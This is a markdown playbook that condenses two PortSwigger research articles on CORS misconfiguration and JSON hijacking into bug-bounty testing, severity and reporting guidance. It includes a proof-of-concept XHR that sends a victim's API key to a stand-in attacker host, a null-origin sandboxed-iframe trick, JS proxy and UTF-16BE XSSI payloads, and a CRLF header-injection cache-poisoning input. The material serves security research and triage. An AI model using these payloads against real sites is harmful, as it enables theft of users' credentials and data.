# CORS & Cross-Origin Origin — Research Articles Compendium

> Consolidated from 2 PortSwigger Research articles (2016, James Kettle + Gareth Heyes): CORS misconfiguration exploitation (bitcoin exchange case studies) and modern JSON hijacking / XSSI via JS proxies + charset abuse. Reference playbook for bug bounty testing/triage.

## Article Map

| Article | Year | Focus |
|---|---|---|
| exploiting-cors-misconfigurations-for-bitcoins-and-bounties | 2016 | Dynamic ACAO reflection, null origin, parser breaks, client/server-side cache poisoning |
| json-hijacking-for-the-modern-web | 2016 | XSSI: JS proxy undefined-variable leak, UTF-16BE charset attacks, CSP bypass |

## Key Techniques — CORS

**Dynamic ACAO reflection (most common vuln)** — server generates `Access-Control-Allow-Origin` from user-supplied Origin. Indicator: ANY `Access-Control-*` header in response with no origin declared, or headers only when Origin sent.
- Test: `Origin: https://evil.com` → if reflected + `Access-Control-Allow-Credentials: true` = credential-stealing chain
- PoC skeleton: `var req=new XMLHttpRequest(); req.onload=()=>location='//attacker.net/log?key='+this.responseText; req.open('get','https://target/api/key',true); req.withCredentials=true; req.send();`

**Wildcard catch** — `ACAO: *` + `Allow-Credentials: true` is rejected by browsers (spec exception). Wildcard silently disables credentials. Don't report wildcard as vuln with-credentials.

**Null origin whitelist** — sites whitelist `Origin: null` (Google PDF reader + exchanges did). Attacker gets null origin via sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src='data:text/html,<script>*cors stuff here*</script>'></iframe>
```
Impact in case study: steal encrypted wallet backups → offline brute-force.

**Whitelist parser breaks:**
- Suffix match: trusts any origin *ending in* `advisor.com` incl. `eviladvisor.com`
- Prefix match: trusts `https://btc.net` prefix incl. `https://btc.net.evil.net`
- Safari `%60` backtick parse: `http://example.com%60.hackxor.net/` sends `Origin: http://example.com.hackxor.net` — parser sees `example.com`. `_` variant extends to Chrome/Firefox (Corben technique)
- Blind subdomain whitelist: ANY subdomain incl. third-party-hosted = future XSS = data theft
- Protocol not restricted: HTTPS site accepting `http://` origins = active MITM bypasses HTTPS entirely

**Client-side cache poisoning via CORS** — page reflects custom header (e.g. `X-User-id`) + `Access-Control-Allow-Headers` allows it + NO `Vary: Origin` → force victim browser to send poisoned request via CORS, response cached browser-side, next navigation serves XSS. Reliable (browser cache).

**Server-side cache poisoning** — IE/Edge treat `\r` (0x0d) as header terminator; reflect unchecked Origin → HTTP header injection (`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`) → cached stored XSS via UTF-7. Craft manually in Burp, cache poisons for everyone.

**Missing Vary: Origin** — itself only breaks things unless combined with caching above; still report as contributing factor, not standalone HIGH.

**No-credentials CORS abuse** — no cookies = no direct data theft, BUT victim browser as network-position proxy: bypass IP auth, read intranet-only apps (DNS-rebinding-lite, less fiddly).

## Key Techniques — XSSI / JSON Hijacking

**JS proxy undefined-variable leak** — cross-domain `<script src>` containing bare identifiers; proxy `has` trap reveals undefined variable names:
```js
Object.setPrototypeOf(__proto__,new Proxy(__proto__,{has:function(t,n){alert(n)}}));
// Edge variant: __proto__.__proto__=new Proxy(...)
// get trap variant (Terada): undefined vars become defined=1 → steal multiple
```

**UTF-16BE charset attack** — `<script charset="UTF-16BE" src=...>` reinterprets response bytes; pairs form non-ASCII variable names. Steals JSON feeds `["supersecret","abc"]` when attacker controls part of response (multi-byte padding trick: `mb_convert_encoding("=1337;for(i in window)...", "UTF-16BE")`). Works without proxies if response partially controlled.

**CSP bypass via UTF-16BE self-injection** — `<script src="self?x=<utf16be-payload>" charset="UTF-16BE">` on same-domain-allowed CSP; newlines convert to non-ASCII variables so whole HTML becomes valid JS. Patched (PHP ≥5.6 defaults UTF-8) but resurrectable when JSON response omits charset.

**CSS/XOR note** — technique does NOT transfer to stylesheets (doctype/MIME sniffing blocks it).

## By-Design / SKIP Filters

- `ACAO: *` WITHOUT credentials on public unauthenticated endpoints = normal, INFO
- Reflected Origin WITHOUT `Allow-Credentials` and without cache interactions = INFO (no data theft possible)
- CORS misconfig on endpoint returning non-sensitive data = LOW/INFO — must show sensitive data in response body
- `Vary: Origin` missing alone with no reflection/cache vector = INFO
- Modern browsers only: UTF-16BE/proxy XSSI techniques are historical (Chrome 54+, Edge legacy) — theoretical on current browsers, label [THEORETICAL]
- Subdomain-whitelisted CORS on dedicated subdomain with no XSS surface and sane sandbox = LOW unless third-party-hosted

## Severity Guide

- ACAO reflects arbitrary origin + credentials + sensitive data (API keys, PII, wallet): HIGH/CRITICAL
- Null origin accepted + credentials + sensitive data: HIGH
- Whitelist parser break (prefix/suffix/backtick) + credentials: HIGH (browser-scoped; note which browsers)
- CORS → client/server-side cache poisoning → stored XSS: HIGH
- No-credentials CORS on intranet/IP-gated app: MEDIUM
- Missing Vary alone / wildcard+no-creds / reflection w/o sensitive data: INFO–LOW

## Reporting Checklist

- [ ] Capture request+response showing reflected/generated ACAO with attacker origin
- [ ] Confirm `Access-Control-Allow-Credentials: true` where claimed
- [ ] Working PoC page (XHR/fetch withCredentials) showing exfil of REAL sensitive value in response — screenshot with attacker listener
- [ ] State browser scope for parser-break techniques (Safari `_`/backtick, IE/Edge `\r`)
- [ ] No wildcard+credentials false claim (browsers block it — verify in console)
- [ ] Blocked chain (creds absent, data non-sensitive) ⇒ INFORMATIONAL per master KB
- [ ] Cache-poisoning claims: show cached response served to second context

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
